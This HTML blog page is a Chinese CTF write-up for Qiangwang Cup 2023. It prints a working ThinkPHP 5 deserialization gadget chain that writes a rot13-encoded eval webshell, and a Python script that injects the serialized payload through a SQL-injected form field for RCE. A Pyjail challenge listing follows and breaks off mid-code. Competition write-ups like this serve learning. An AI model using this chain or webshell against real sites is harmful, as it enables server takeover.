@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"chensonghi.github.io.","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Sidebar Display (only for Muse | Mist), available values":["always  expand for all pages automatically."],"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Web给了docker，代码逻辑  mad，开局这里不是admin  这个函数有sql注入  找到逻辑  继续  1$view-&gt;arrayToMarkdown(unserialize(base64_decode($goods[&amp;#x27;data&amp;#x27;])))   抓包，获取请求数据 从docker中可以看到，flag不在数据库里面，所以我们需要RCE，emm 这里有个反序列化 12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2023">
+<meta property="og:url" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/index.html">
+<meta property="og:site_name" content="星河风">
+<meta property="og:description" content="Web给了docker，代码逻辑  mad，开局这里不是admin  这个函数有sql注入  找到逻辑  继续  1$view-&gt;arrayToMarkdown(unserialize(base64_decode($goods[&amp;#x27;data&amp;#x27;])))   抓包，获取请求数据 从docker中可以看到，flag不在数据库里面，所以我们需要RCE，emm 这里有个反序列化 12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218230623159-1707064057755-1.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231219003304097-1707064057755-2.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218230743819-1707064057755-3.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218230846206-1707064057755-4.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218230905900-1707064057755-5.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218231424714-1707064057755-6.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218232718457-1707064057755-7.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218235801197-1707064057755-8.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218235942528-1707064057755-9.png">
+<meta property="og:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231219000032765-1707064057755-10.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20231219005108031-1707064057755-11.png">
+<meta property="og:image" content="https://chensonghi.github.io./image-20231219005038815-1707064057755-12.png">
+<meta property="article:published_time" content="2023-12-26T16:26:21.000Z">
+<meta property="article:modified_time" content="2024-02-04T16:31:20.951Z">
+<meta property="article:author" content="chleynx">
+<meta property="article:tag" content="2023">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chensonghi.github.io./2023/12/27/qiangwangbei/image-20231218230623159-1707064057755-1.png">
+
+<link rel="canonical" href="https://chensonghi.github.io./2023/12/27/qiangwangbei/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>强网杯2023 | 星河风</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">星河风</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/12/27/qiangwangbei/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="星河风">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯2023
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-12-27 00:26:21" itemprop="dateCreated datePublished" datetime="2023-12-27T00:26:21+08:00">2023-12-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-02-05 00:31:20" itemprop="dateModified" datetime="2024-02-05T00:31:20+08:00">2024-02-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>给了docker，代码逻辑</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218230623159-1707064057755-1.png" alt="image-20231218230623159"></p>
+<p>mad，开局这里不是admin</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231219003304097-1707064057755-2.png" alt="image-20231219003304097"></p>
+<p>这个函数有sql注入</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218230743819-1707064057755-3.png" alt="image-20231218230743819"></p>
+<p>找到逻辑</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218230846206-1707064057755-4.png" alt="image-20231218230846206"></p>
+<p>继续</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218230905900-1707064057755-5.png" alt="image-20231218230905900"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$view-&gt;arrayToMarkdown(unserialize(base64_decode($goods[&#x27;data&#x27;])))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/27/qiangwangbei/image-20231218231424714-1707064057755-6.png" alt="image-20231218231424714"></p>
+<p>抓包，获取请求数据</p>
+<p>从docker中可以看到，flag不在数据库里面，所以我们需要RCE，emm</p>
+<p>这里有个反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line">class Pipes</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files = [new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">abstract class Relation</span><br><span class="line">&#123;</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;selfRelation = false;</span><br><span class="line">        $this-&gt;query = new Query();#class Query</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">#OneToOne HasOne</span><br><span class="line">use think\model\Relation;</span><br><span class="line"></span><br><span class="line">abstract class OneToOne extends Relation</span><br><span class="line">&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HasOne extends OneToOne</span><br><span class="line">&#123;</span><br><span class="line">    protected $bindAttr = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $this-&gt;bindAttr = [&quot;no&quot;, &quot;123&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">#Output</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line"></span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    private $handle = null;</span><br><span class="line">    protected $styles = [];</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handle = new Memcached();//目的调用其write()</span><br><span class="line">        $this-&gt;styles = [&#x27;getAttr&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">#Model</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line">abstract class Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line">    public $parent;#修改处</span><br><span class="line">    protected $selfRelation;</span><br><span class="line">    protected $query;</span><br><span class="line">    protected $aaaaa;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;parent = new Output();#Output对象,目的是调用__call()</span><br><span class="line">        $this-&gt;append = [&#x27;getError&#x27;];</span><br><span class="line">        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()</span><br><span class="line">        $this-&gt;selfRelation = false;//isSelfRelation()</span><br><span class="line">        $this-&gt;query = new Query();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;</span><br><span class="line">#Query</span><br><span class="line">use think\console\Output;</span><br><span class="line"></span><br><span class="line">class Query</span><br><span class="line">&#123;</span><br><span class="line">    protected $model;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;model = new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;</span><br><span class="line">#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line"></span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler = new File();//目的调用File-&gt;set()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">#File</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $tag;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27; =&gt; 0,</span><br><span class="line">            &#x27;cache_subdir&#x27; =&gt; false,</span><br><span class="line">            &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27; =&gt; &#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize([new Windows()]));</span><br></pre></td></tr></table></figure>
+
+<p>直接网上找条链子就打通了</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218232718457-1707064057755-7.png" alt="image-20231218232718457"></p>
+<p>需要数组形式的</p>
+<p>然后构造一个sql语句</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218235801197-1707064057755-8.png" alt="image-20231218235801197"></p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://192.168.153.130:36000/public/index.php/index/admin/do_edit.html&#x27;</span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    &#x27;PHPSESSID&#x27;: &#x27;l98e9omcje3gljtum9ith1ffn6&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">exp = &quot;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&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;id&#x27;: &#x27;1&#x27;,</span><br><span class="line">    &#x27;name&#x27;: &#x27;1&#x27;,</span><br><span class="line">    &#x27;price&#x27;: &#x27;1.00&#x27;,</span><br><span class="line">    &#x27;on_sale_time&#x27;: &#x27;2023-12-16T21:20&#x27;,</span><br><span class="line">    &#x27;image&#x27;: &#x27;$sql&#x27;,</span><br><span class="line">    f&quot;data`=&#x27;&#123;exp&#125;&#x27;/**/WHERE/**/`id`/**/=/**/1;#&quot;: &#x27;123&#x27;,</span><br><span class="line">    &#x27;data&#x27;: &#x27;1&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, cookies=cookies, data=data)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>最后访问页面，触发反序列化</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231218235942528-1707064057755-9.png" alt="image-20231218235942528"></p>
+<p>本地打一下，看见打上去了</p>
+<p>直接RCE</p>
+<p><img src="/2023/12/27/qiangwangbei/image-20231219000032765-1707064057755-10.png" alt="image-20231219000032765"></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Pyjail-It’s-myFILTER"><a href="#Pyjail-It’s-myFILTER" class="headerlink" title="Pyjail ! It’s myFILTER !!!"></a>Pyjail ! It’s myFILTER !!!</h3><p>源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># Python Version:python3.10</span><br><span class="line"># Source Code:</span><br><span class="line"></span><br><span class="line">import code, os, subprocess</span><br><span class="line">import pty</span><br><span class="line">def blacklist_fun_callback(*args):</span><br><span class="line">    print(&quot;Player! It&#x27;s already banned!&quot;)</span><br><span class="line"></span><br><span class="line">pty.spawn = blacklist_fun_callback</span><br><span class="line">os.system = blacklist_fun_callback</span><br><span class="line">os.popen = blacklist_fun_callback</span><br><span class="line">subprocess.Popen = blacklist_fun_callback</span><br><span class="line">subprocess.call = blacklist_fun_callback</span><br><span class="line">code.interact = blacklist_fun_callback</span><br><span class="line">code.compile_command = blacklist_fun_callback</span><br><span 